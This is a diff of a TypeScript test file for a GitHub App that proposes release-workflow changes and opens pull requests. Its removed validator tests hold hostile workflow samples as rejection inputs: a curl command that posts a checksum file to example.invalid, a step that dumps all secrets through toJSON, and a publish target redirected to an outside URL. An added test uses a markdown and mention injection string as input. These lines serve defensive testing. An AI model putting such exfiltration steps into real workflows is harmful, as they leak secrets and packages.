@@ -1,16 +1,14 @@
 import { afterEach, describe, expect, test, vi } from "vitest";
-import { MockLanguageModelV3 } from "ai/test";
 import {
-  generateSetupDraft,
+  markdownCodeSpan,
   setupDraftRequestSchema,
-  signSetupProposal,
-  validateSetupDraft,
-  verifySetupProposal,
+  setupManualSteps,
 } from "../server/lib/github-app/setup-draft";
 import {
   createSetupClient,
   createSetupPullRequest,
   inspectPublisherSetup,
+  setupTreeHasCaseTwin,
   type SetupGithubClient,
 } from "../server/lib/github-app/setup-api";
 import type { GithubAppConfig } from "../server/lib/github-app/config";
@@ -18,14 +16,7 @@ import {
   SETUP_BASE_SHA,
   SETUP_BLOB_SHA,
   SETUP_DRAFT_REQUEST,
-  SETUP_NPM_GUIDE_WORKFLOW,
-  SETUP_NPM_STAGING_GUIDE_WORKFLOW,
   SETUP_ORIGINAL_WORKFLOW,
-  SETUP_PROPOSED_WORKFLOW,
-  SETUP_PYPI_GUIDE_WORKFLOW,
-  SETUP_PYPI_ORIGINAL_WORKFLOW,
-  SETUP_VSCODE_GUIDE_WORKFLOW,
-  SETUP_VSCODE_ORIGINAL_WORKFLOW,
   setupProposal,
 } from "./helpers/publisher-setup-fixtures";
 
@@ -48,260 +39,138 @@ function client(request: SetupGithubClient["request"]): SetupGithubClient {
     repository: { id: 42, fullName: "octo/release", defaultBranch: "main" },
     path: "/repos/octo/release",
     request,
+    revokeToken: async () => {},
   };
 }
 
+const CURRENT_HEAD = "c".repeat(40);
+function recoveryEvidence(suffix: string, proposal = setupProposal()): unknown {
+  const ids = {
+    base: "d".repeat(40),
+    current: "e".repeat(40),
+    ghBase: "f".repeat(40),
+    ghCurrent: "1".repeat(40),
+    workflowsBase: "2".repeat(40),
+    workflowsCurrent: "3".repeat(40),
+    currentBlob: "4".repeat(40),
+  };
+  if (suffix === `/git/commits/${SETUP_BASE_SHA}`)
+    return { sha: SETUP_BASE_SHA, tree: { sha: ids.base } };
+  if (suffix === `/git/commits/${CURRENT_HEAD}`)
+    return { sha: CURRENT_HEAD, tree: { sha: ids.current } };
+  if (suffix === `/git/trees/${ids.base}` || suffix === `/git/trees/${ids.current}`)
+    return {
+      truncated: false,
+      tree: [
+        {
+          path: ".github",
+          type: "tree",
+          mode: "040000",
+          sha: suffix.endsWith(ids.base) ? ids.ghBase : ids.ghCurrent,
+        },
+      ],
+    };
+  if (suffix === `/git/trees/${ids.ghBase}` || suffix === `/git/trees/${ids.ghCurrent}`)
+    return {
+      truncated: false,
+      tree: [
+        {
+          path: "workflows",
+          type: "tree",
+          mode: "040000",
+          sha: suffix.endsWith(ids.ghBase) ? ids.workflowsBase : ids.workflowsCurrent,
+        },
+      ],
+    };
+  if (
+    suffix === `/git/trees/${ids.workflowsBase}` ||
+    suffix === `/git/trees/${ids.workflowsCurrent}`
+  )
+    return {
+      truncated: false,
+      tree: [
+        {
+          path: "release.yml",
+          type: "blob",
+          mode: "100644",
+          sha: suffix.endsWith(ids.workflowsBase) ? SETUP_BLOB_SHA : ids.currentBlob,
+        },
+      ],
+    };
+  if (
+    suffix === `/contents/${proposal.workflowPath}?ref=${SETUP_BASE_SHA}` ||
+    suffix === `/contents/${proposal.workflowPath}?ref=${CURRENT_HEAD}`
+  ) {
+    const original = suffix.endsWith(SETUP_BASE_SHA);
+    const content = original ? SETUP_ORIGINAL_WORKFLOW : proposal.content;
+    return {
+      type: "file",
+      path: proposal.workflowPath,
+      sha: original ? SETUP_BLOB_SHA : ids.currentBlob,
+      size: content.length,
+      content: btoa(content),
+      encoding: "base64",
+    };
+  }
+  return undefined;
+}
+
+function uncertainSetupClient(failAfter: "branch" | "file" | "pr" | null = null) {
+  const proposal = setupProposal();
+  const state = { branch: "", head: SETUP_BASE_SHA, opened: false, extraEdits: false };
+  const writes: string[] = [];
+  let failed = false;
+  const request = vi.fn(async (suffix: string, init?: RequestInit) => {
+    if (suffix.startsWith("/pulls?"))
+      return state.opened
+        ? [
+            {
+              number: 12,
+              head: { ref: state.branch, repo: { id: 42 } },
+              base: { ref: "main", repo: { id: 42 } },
+            },
+          ]
+        : [];
+    if (suffix === "/git/ref/heads/main") return { object: { sha: SETUP_BASE_SHA } };
+    if (suffix.startsWith("/git/ref/heads/"))
+      return state.branch ? { object: { sha: state.head } } : null;
+    if (suffix.startsWith("/compare/"))
+      return {
+        files: [
+          { filename: proposal.workflowPath },
+          ...(state.extraEdits ? [{ filename: "other.yml" }] : []),
+        ],
+      };
+    const evidence = recoveryEvidence(suffix, proposal);
+    if (evidence !== undefined) return evidence;
+    if (suffix.includes("?ref=")) {
+      const original = suffix.endsWith(`?ref=${SETUP_BASE_SHA}`);
+      const content = original ? SETUP_ORIGINAL_WORKFLOW : proposal.content;
+      return {
+        type: "file",
+        path: proposal.workflowPath,
+        sha: SETUP_BLOB_SHA,
+        size: content.length,
+        content: btoa(content),
+        encoding: "base64",
+      };
+    }
+    const body = JSON.parse(String(init?.body)) as Record<string, unknown>;
+    writes.push(suffix);
+    const mutation = suffix === "/git/refs" ? "branch" : suffix === "/pulls" ? "pr" : "file";
+    if (mutation === "branch") state.branch = String(body.ref).slice("refs/heads/".length);
+    if (mutation === "file") state.head = "c".repeat(40);
+    if (mutation === "pr") state.opened = true;
+    if (mutation === failAfter && !failed) {
+      failed = true;
+      throw new Error("The write completed but its response was lost.");
+    }
+    return mutation === "pr" ? { number: 12 } : {};
+  });
+  return { client: client(request), proposal, state, writes };
+}
+
 describe("publisher setup proposal", () => {
-  test("accepts build-once artifact review and publishing from downloaded bytes", () => {
-    expect(() =>
-      validateSetupDraft(SETUP_ORIGINAL_WORKFLOW, SETUP_PROPOSED_WORKFLOW, SETUP_DRAFT_REQUEST),
-    ).not.toThrow();
-  });
-  test.each([
-    [
-      "ungated publisher",
-      SETUP_PROPOSED_WORKFLOW.replace("environment: production", "environment: staging"),
-    ],
-    [
-      "rebuild after review",
-      SETUP_PROPOSED_WORKFLOW.replace(
-        "npm publish *.tgz --provenance",
-        "npm run build\n      - run: npm publish *.tgz --provenance",
-      ),
-    ],
-    [
-      "unreviewed directory publication",
-      SETUP_PROPOSED_WORKFLOW.replace("npm publish *.tgz", "npm publish"),
-    ],
-    ["no upstream dependency", SETUP_PROPOSED_WORKFLOW.replace("needs: build", "needs: absent")],
-    ["changed triggers", SETUP_PROPOSED_WORKFLOW.replace("workflow_dispatch:", "push:")],
-    ["extra publisher", SETUP_PROPOSED_WORKFLOW + "      - run: npm publish *.tgz\n"],
-    ["duplicate YAML keys", SETUP_PROPOSED_WORKFLOW + "jobs: {}\n"],
-    [
-      "publishing action without archive binding",
-      SETUP_PROPOSED_WORKFLOW.replace(
-        "- run: npm publish *.tgz --provenance",
-        "- uses: JS-DevTools/npm-publish@v3",
-      ),
-    ],
-    [
-      "producer gated before upload",
-      SETUP_PROPOSED_WORKFLOW.replace(
-        "  build:\n",
-        "  build:\n    environment:\n      name: production\n",
-      ),
-    ],
-    [
-      "archive name only in a shell comment",
-      SETUP_PROPOSED_WORKFLOW.replace("npm publish *.tgz --provenance", "npm publish # *.tgz"),
-    ],
-    [
-      "artifact download after publication",
-      SETUP_PROPOSED_WORKFLOW.replace(
-        "      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidates\n      - run: npm publish *.tgz --provenance",
-        "      - run: npm publish *.tgz --provenance\n      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidates",
-      ),
-    ],
-    [
-      "foreign run artifact",
-      SETUP_PROPOSED_WORKFLOW.replace(
-        "      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidates",
-        "      - uses: actions/download-artifact@v4\n        with:\n          name: npm-release-candidates\n          run-id: 123",
-      ),
-    ],
-  ])("rejects %s", (_label, candidate) => {
-    expect(() =>
-      validateSetupDraft(SETUP_ORIGINAL_WORKFLOW, candidate, SETUP_DRAFT_REQUEST),
-    ).toThrow();
-  });
-  const pypiRequest = { ...SETUP_DRAFT_REQUEST, ecosystem: "pypi" as const, environment: "pypi" };
-  const vscodeRequest = { ...SETUP_DRAFT_REQUEST, ecosystem: "vscode" as const };
-  const pinned = "actions/download-artifact@" + "d".repeat(40);
-  test.each([
-    ["npm guide", SETUP_ORIGINAL_WORKFLOW, SETUP_NPM_GUIDE_WORKFLOW, SETUP_DRAFT_REQUEST],
-    [
-      "npm gated staging guide",
-      SETUP_ORIGINAL_WORKFLOW,
-      SETUP_NPM_STAGING_GUIDE_WORKFLOW,
-      SETUP_DRAFT_REQUEST,
-    ],
-    ["PyPI guide", SETUP_PYPI_ORIGINAL_WORKFLOW, SETUP_PYPI_GUIDE_WORKFLOW, pypiRequest],
-    [
-      "PyPI uv publish",
-      SETUP_PYPI_ORIGINAL_WORKFLOW,
-      SETUP_PYPI_GUIDE_WORKFLOW.replace(
-        "      - run: rm dist/SHA256SUMS\n      - uses: pypa/gh-action-pypi-publish@release/v1",
-        "      - run: uv publish dist/*.whl dist/*.tar.gz",
-      ),
-      pypiRequest,
-    ],
-    [
-      "PyPI action with matching packages-dir",
-      SETUP_PYPI_ORIGINAL_WORKFLOW,
-      SETUP_PYPI_GUIDE_WORKFLOW.replaceAll("dist", "out").replace(
-        "pypa/gh-action-pypi-publish@release/v1",
-        "pypa/gh-action-pypi-publish@release/v1\n        with:\n          packages-dir: out/\n          attestations: true",
-      ),
-      pypiRequest,
-    ],
-    ["VS Code guide", SETUP_VSCODE_ORIGINAL_WORKFLOW, SETUP_VSCODE_GUIDE_WORKFLOW, vscodeRequest],
-    [
-      "newer artifact actions",
-      SETUP_ORIGINAL_WORKFLOW,
-      SETUP_NPM_GUIDE_WORKFLOW.replaceAll("-artifact@v4", "-artifact@v5.0.1"),
-      SETUP_DRAFT_REQUEST,
-    ],
-    [
-      "a SHA pin the repository already uses",
-      SETUP_ORIGINAL_WORKFLOW.replace(
-        "      - run: npm ci\n",
-        `      - uses: ${pinned}\n        with:\n          name: cache\n      - run: npm ci\n`,
-      ),
-      SETUP_NPM_GUIDE_WORKFLOW.replace("actions/download-artifact@v4", pinned),
-      SETUP_DRAFT_REQUEST,
-    ],
-    [
-      "an environment named with different case",
-      SETUP_ORIGINAL_WORKFLOW,
-      SETUP_NPM_GUIDE_WORKFLOW.replace("environment: production", "environment: Production"),
-      { ...SETUP_DRAFT_REQUEST, environment: "PRODUCTION" },
-    ],
-  ])("accepts the %s", (_label, original, candidate, request) => {
-    expect(() => validateSetupDraft(original, candidate, request)).not.toThrow();
-  });
-  test.each([
-    [
-      "an unknown SHA pin",
-      SETUP_NPM_GUIDE_WORKFLOW.replace("actions/download-artifact@v4", pinned),
-    ],
-    [
-      "a retired artifact action",
-      SETUP_NPM_GUIDE_WORKFLOW.replace("actions/upload-artifact@v4", "actions/upload-artifact@v3"),
-    ],
-    [
-      "a shell override on the publisher",
-      SETUP_NPM_GUIDE_WORKFLOW.replace(
-        "      - run: npm publish *.tgz",
-        "      - run: npm publish *.tgz\n        shell: python {0}",
-      ),
-    ],
-    [
-      "a shell default on the publish job",
-      SETUP_NPM_GUIDE_WORKFLOW.replace(
-        "    needs: pack\n",
-        "    needs: pack\n    defaults:\n      run:\n        shell: python {0}\n",
-      ),
-    ],
-    [
-      "an arbitrary command after the download",
-      SETUP_NPM_GUIDE_WORKFLOW.replace(
-        "sha256sum --check --strict SHA256SUMS",
-        "curl -d @SHA256SUMS https://example.invalid",
-      ),
-    ],
-    [
-      "a digest check outside the download directory",
-      SETUP_NPM_STAGING_GUIDE_WORKFLOW.replace(
-        "cd dist && sha256sum --check",
-        "cd other && sha256sum --check",
-      ),
-    ],
-    [
-      "a publish path outside the download directory",
-      SETUP_NPM_STAGING_GUIDE_WORKFLOW.replace(
-        "npm stage publish dist/*.tgz",
-        "npm stage publish *.tgz",
-      ),
-    ],
-    [
-      "a download outside the job directory",
-      SETUP_NPM_STAGING_GUIDE_WORKFLOW.replace(
-        "          path: dist\n",
-        "          path: ../dist\n",
-      ).replaceAll("dist/", "../dist/"),
-    ],
-    [
-      "a dependency install in the publish job",
-      SETUP_NPM_STAGING_GUIDE_WORKFLOW.replace(
-        "npm install -g npm@^11.15.0",
-        "npm install -g left-pad",
-      ),
-    ],
-    [
-      "a new secret reference",
-      SETUP_NPM_GUIDE_WORKFLOW.replace(
-        "      - run: npm publish *.tgz",
-        "      - run: npm publish *.tgz\n        env:\n          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}",
-      ),
-    ],
-    [
-      "dynamic secret access",
-      SETUP_NPM_GUIDE_WORKFLOW.replace(
-        "      - run: npm ci",
-        "      - run: npm ci\n        env:\n          ALL: ${{ toJSON(secrets) }}",
-      ),
-    ],
-    [
-      "a reusable workflow inheriting secrets",
-      SETUP_NPM_GUIDE_WORKFLOW +
-        "  notify:\n    uses: octo/actions/.github/workflows/notify.yml@main\n    secrets: inherit\n",
-    ],
-  ])("rejects %s", (_label, candidate) => {
-    expect(() =>
-      validateSetupDraft(SETUP_ORIGINAL_WORKFLOW, candidate, SETUP_DRAFT_REQUEST),
-    ).toThrow();
-  });
-  test.each([
-    [
-      "a mismatched packages-dir",
-      SETUP_PYPI_GUIDE_WORKFLOW.replace(
-        "pypa/gh-action-pypi-publish@release/v1",
-        "pypa/gh-action-pypi-publish@release/v1\n        with:\n          packages-dir: build/",
-      ),
-    ],
-    [
-      "a redirected repository",
-      SETUP_PYPI_GUIDE_WORKFLOW.replace(
-        "pypa/gh-action-pypi-publish@release/v1",
-        "pypa/gh-action-pypi-publish@release/v1\n        with:\n          repository-url: https://example.invalid/legacy/",
-      ),
-    ],
-    [
-      "action inputs passed through env",
-      SETUP_PYPI_GUIDE_WORKFLOW.replace(
-        "pypa/gh-action-pypi-publish@release/v1",
-        "pypa/gh-action-pypi-publish@release/v1\n        env:\n          INPUT_REPOSITORY-URL: https://example.invalid/legacy/",
-      ),
-    ],
-  ])("rejects a PyPI publishing action with %s", (_label, candidate) => {
-    expect(() => validateSetupDraft(SETUP_PYPI_ORIGINAL_WORKFLOW, candidate, pypiRequest)).toThrow(
-      /publish the downloaded archives/,
-    );
-  });
-  test("requires manual setup for privileged and indirectly triggered workflows", () => {
-    expect(() =>
-      validateSetupDraft(
-        SETUP_ORIGINAL_WORKFLOW.replace("workflow_dispatch:", "pull_request_target:"),
-        SETUP_PROPOSED_WORKFLOW,
-        SETUP_DRAFT_REQUEST,
-      ),
-    ).toThrow(/manual setup/);
-  });
-  test("rejects a PyPI publishing action whose input is not bound to downloaded bytes", () => {
-    const candidate = SETUP_PROPOSED_WORKFLOW.replaceAll(
-      "npm-release-candidates",
-      "pypi-release-candidate",
-    ).replace(
-      "- run: npm publish *.tgz --provenance",
-      "- uses: pypa/gh-action-pypi-publish@release/v1",
-    );
-    expect(() =>
-      validateSetupDraft(SETUP_ORIGINAL_WORKFLOW, candidate, {
-        ...SETUP_DRAFT_REQUEST,
-        ecosystem: "pypi",
-      }),
-    ).toThrow(/publish the downloaded archives/);
-  });
   test("bounds environment and workflow input", () => {
     expect(
       setupDraftRequestSchema.safeParse({
@@ -318,62 +187,76 @@ describe("publisher setup proposal", () => {
         .environment,
     ).toBe("production");
   });
-  test("binds proposals to purpose, content, organization, user, and expiry", async () => {
-    const proposal = setupProposal();
-    const token = await signSetupProposal("secret", proposal, "org-a", "user-a");
-    expect(await verifySetupProposal("secret", proposal, token, "org-a", "user-a")).toBe(true);
-    expect(await verifySetupProposal("secret", proposal, token, "org-b", "user-a")).toBe(false);
-    expect(await verifySetupProposal("secret", proposal, token, "org-a", "user-b")).toBe(false);
-    expect(
-      await verifySetupProposal(
-        "secret",
-        { ...proposal, content: "changed" },
-        token,
-        "org-a",
-        "user-a",
-      ),
-    ).toBe(false);
-    expect(
-      await verifySetupProposal(
-        "secret",
-        { ...proposal, expiresAt: Date.now() - 1 },
-        token,
-        "org-a",
-        "user-a",
-      ),
-    ).toBe(false);
-  });
-  test("validates a structured model output before returning the draft", async () => {
-    const model = new MockLanguageModelV3({
-      doGenerate: async () => ({
-        content: [
-          {
-            type: "text",
-            text: JSON.stringify({
-              content: SETUP_PROPOSED_WORKFLOW,
-              summary: "Separate packaging and publication.",
-            }),
-          },
-        ],
-        finishReason: { unified: "stop", raw: "stop" },
-        usage: {
-          inputTokens: { total: 10, noCache: 10, cacheRead: 0, cacheWrite: 0 },
-          outputTokens: { total: 10, text: 10, reasoning: 0 },
-        },
-        warnings: [],
-      }),
-    });
-    const draft = await generateSetupDraft(
-      {} as Cloudflare.Env,
-      SETUP_DRAFT_REQUEST,
-      SETUP_ORIGINAL_WORKFLOW,
-      model,
+  test("pull request steps quote the admin-supplied environment as an inert code span", () => {
+    const environment = "@octo [x](https://e.test) closes #1 `tick` ``run`` now";
+    const quoted = markdownCodeSpan(environment);
+    expect(quoted).toBe(`\`\`\`${environment}\`\`\``);
+    expect(markdownCodeSpan("`edge`")).toBe("`` `edge` ``");
+    const markdown = setupManualSteps({ ...SETUP_DRAFT_REQUEST, environment }, markdownCodeSpan);
+    expect(markdown[1]).toContain(`Create the ${quoted} GitHub Environment`);
+    expect(markdown[2]).toContain(`/ ${quoted} as a Drydock release target`);
+    expect(markdown.join("\n").replaceAll(quoted, "")).not.toContain("@octo");
+    expect(setupManualSteps({ ...SETUP_DRAFT_REQUEST, environment })[1]).toContain(
+      `Create the ${environment} GitHub`,
     );
-    expect(draft.content).toBe(SETUP_PROPOSED_WORKFLOW);
+  });
+  test("asks for CI only after the maintainer reviews every file", () => {
+    const step = setupManualSteps(SETUP_DRAFT_REQUEST).find((value) => value.includes("[skip ci]"));
+    expect(step).toMatch(
+      /Only after reviewing every file in this pull request, push a commit or re-run checks/,
+    );
   });
 });
 
 describe("publisher setup GitHub boundary", () => {
+  test("detects case-only twins without matching the exact entry", () => {
+    const tree = [{ path: "scripts" }, { path: "README.md" }];
+    expect(setupTreeHasCaseTwin(tree, "Scripts")).toBe(true);
+    expect(setupTreeHasCaseTwin(tree, "scripts")).toBe(false);
+    expect(setupTreeHasCaseTwin(tree, "docs")).toBe(false);
+  });
+  test.each(["branch", "file", "pr"] as const)(
+    "recovers an uncertain %s write without repeating completed mutations",
+    async (failAfter) => {
+      const transport = uncertainSetupClient(failAfter);
+      await expect(createSetupPullRequest(transport.client, transport.proposal)).rejects.toThrow(
+        /response was lost/,
+      );
+      const result = await createSetupPullRequest(transport.client, transport.proposal);
+      expect(result.number).toBe(12);
+      expect(result.created).toBe(failAfter !== "pr");
+      expect(transport.writes).toEqual([
+        "/git/refs",
+        `/contents/${transport.proposal.workflowPath}`,
+        "/pulls",
+      ]);
+    },
+  );
+  test("refuses to resume a partially written branch containing other edits", async () => {
+    const transport = uncertainSetupClient("file");
+    await expect(createSetupPullRequest(transport.client, transport.proposal)).rejects.toThrow();
+    transport.state.extraEdits = true;
+    await expect(createSetupPullRequest(transport.client, transport.proposal)).rejects.toThrow(
+      /other edits/,
+    );
+    expect(transport.writes).toEqual(["/git/refs", `/contents/${transport.proposal.workflowPath}`]);
+  });
+  test.each([1, 2, 3])(
+    "authority revoked before mutation %i prevents it and later mutations",
+    async (denyAt) => {
+      const transport = uncertainSetupClient();
+      let attempts = 0;
+      const beforeWrite = vi.fn(async () => {
+        if (++attempts === denyAt) throw new Error("Setup authority revoked.");
+      });
+      await expect(
+        createSetupPullRequest(transport.client, transport.proposal, beforeWrite),
+      ).rejects.toThrow(/authority revoked/);
+      expect(beforeWrite).toHaveBeenCalledTimes(denyAt);
+      expect(transport.writes).toHaveLength(denyAt - 1);
+      expect(transport.state.opened).toBe(false);
+    },
+  );
   test("requests a single repository and read permissions without following redirects", async () => {
     const calls: Request[] = [];
     vi.stubGlobal(
@@ -397,6 +280,40 @@ describe("publisher setup GitHub boundary", () => {
           request.redirect === "manual" && new URL(request.url).hostname === "api.github.com",
       ),
     ).toBe(true);
+  });
+  test("retries a transient installation-token failure and revokes the token on request", async () => {
+    const calls: Request[] = [];
+    let mints = 0;
+    vi.stubGlobal(
+      "fetch",
+      vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
+        const request = new Request(input, init);
+        calls.push(request);
+        if (request.url.includes("access_tokens"))
+          return ++mints === 1
+            ? new Response("upstream", { status: 502 })
+            : Response.json({ token: "installation-token" });
+        if (request.url.endsWith("/installation/token")) throw new Error("network down");
+        return Response.json({ id: 42, full_name: "octo/release", default_branch: "main" });
+      }),
+    );
+    const setup = await createSetupClient(config, "100", "octo/release", true);
+    expect(mints).toBe(2);
+    await expect(setup.revokeToken()).resolves.toBeUndefined();
+    const revoke = calls.at(-1)!;
+    expect(revoke.method).toBe("DELETE");
+    expect(revoke.url).toBe("https://api.github.com/installation/token");
+    expect(revoke.redirect).toBe("manual");
+    expect(revoke.headers.get("authorization")).toBe("Bearer installation-token");
+  });
+  test("reports a persistent token-service outage as GitHub unavailable, not missing permissions", async () => {
+    vi.stubGlobal(
+      "fetch",
+      vi.fn(async () => new Response("upstream", { status: 503 })),
+    );
+    await expect(createSetupClient(config, "100", "octo/release", true)).rejects.toMatchObject({
+      code: "github_unavailable",
+    });
   });
   test("rejects renamed or foreign repository identity", async () => {
     vi.stubGlobal(
@@ -444,10 +361,15 @@ describe("publisher setup GitHub boundary", () => {
     await expect(createSetupPullRequest(client(request), setupProposal())).rejects.toThrow(
       /default branch changed/,
     );
-    expect(request.mock.calls.every(([, init]) => !init)).toBe(true);
+    expect(request.mock.calls.every(([, init]) => (init?.method ?? "GET") === "GET")).toBe(true);
   });
-  test("recovers an existing proposal PR without any writes", async () => {
-    const request = vi.fn(async (suffix: string) => {
+  test("recovers an existing proposal PR only after checking its complete current bytes", async () => {
+    const request = vi.fn(async (suffix: string, _init?: RequestInit) => {
+      const evidence = recoveryEvidence(suffix);
+      if (evidence !== undefined) return evidence;
+      if (suffix.startsWith("/git/ref/heads/")) return { object: { sha: CURRENT_HEAD } };
+      if (suffix.startsWith("/compare/"))
+        return { files: [{ filename: SETUP_DRAFT_REQUEST.workflowPath }] };
       const head = new URL(`https://api.github.com${suffix}`).searchParams
         .get("head")
         ?.split(":")[1];
@@ -462,11 +384,16 @@ describe("publisher setup GitHub boundary", () => {
     const result = await createSetupPullRequest(client(request), setupProposal());
     expect(result.number).toBe(12);
     expect(result.created).toBe(false);
-    expect(request).toHaveBeenCalledTimes(1);
+    expect(request.mock.calls.every(([, init]) => (init?.method ?? "GET") === "GET")).toBe(true);
   });
   test("re-drafted identical content looks up the same branch and only open PRs", async () => {
     const lookups: URLSearchParams[] = [];
     const request = vi.fn(async (suffix: string) => {
+      const evidence = recoveryEvidence(suffix);
+      if (evidence !== undefined) return evidence;
+      if (suffix.startsWith("/git/ref/heads/")) return { object: { sha: CURRENT_HEAD } };
+      if (suffix.startsWith("/compare/"))
+        return { files: [{ filename: SETUP_DRAFT_REQUEST.workflowPath }] };
       lookups.push(new URL(`https://api.github.com${suffix}`).searchParams);
       return [
         {
@@ -500,7 +427,12 @@ describe("publisher setup GitHub boundary", () => {
             ]
           : [];
       if (suffix === "/git/ref/heads/main") return { object: { sha: SETUP_BASE_SHA } };
-      if (suffix.startsWith("/git/ref/heads/")) return null;
+      if (suffix.startsWith("/git/ref/heads/"))
+        return opened ? { object: { sha: CURRENT_HEAD } } : null;
+      const evidence = recoveryEvidence(suffix);
+      if (evidence !== undefined) return evidence;
+      if (suffix.startsWith("/compare/"))
+        return { files: [{ filename: SETUP_DRAFT_REQUEST.workflowPath }] };
       if (suffix.includes("?ref="))
         return {
           type: "file",
